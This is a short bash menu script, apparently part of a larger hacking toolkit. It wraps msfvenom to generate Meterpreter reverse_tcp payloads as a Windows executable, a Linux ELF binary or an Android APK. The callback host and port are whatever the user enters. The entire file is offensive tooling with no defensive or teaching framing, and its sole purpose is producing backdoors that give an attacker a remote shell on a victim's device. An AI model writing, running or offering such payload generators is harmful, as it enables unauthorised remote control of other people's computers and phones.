#!/bin/bash

echo ""
echo "Select the type of payload you want to create:"
echo " [01] Windows"
echo " [02] Linux"
echo " [03] Android"
echo ""
read -p "Select an option: " payloadOption

case $payloadOption in
    1 | 01)
        read -p "Enter the LHOST IP: " LHOST
        read -p "Enter the LPORT port: " LPORT
        read -p "Enter the output file name: " outputName
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > $outputName.exe
        echo -e "${GREEN}Windows payload created: ${outputName}.exe${NC}"
        ;;
    2 | 02)
        read -p "Enter the LHOST IP: " LHOST
        read -p "Enter the LPORT port: " LPORT
        read -p "Enter the output file name: " outputName
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > $outputName.elf
        echo -e "${GREEN}Linux payload created: ${outputName}.elf${NC}"
        ;;
    3 | 03)
        read -p "Enter the LHOST IP: " LHOST
        read -p "Enter the LPORT port: " LPORT
        read -p "Enter the output file name: " outputName
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $outputName.apk
        echo -e "${GREEN}Android payload created: ${outputName}.apk${NC}"
        ;;
    *)
        echo -e "${RED}Invalid option. Exiting...${NC}"
        exit 1
        ;;
esac

read -p "Press any key to exit..."
./noxk1.sh
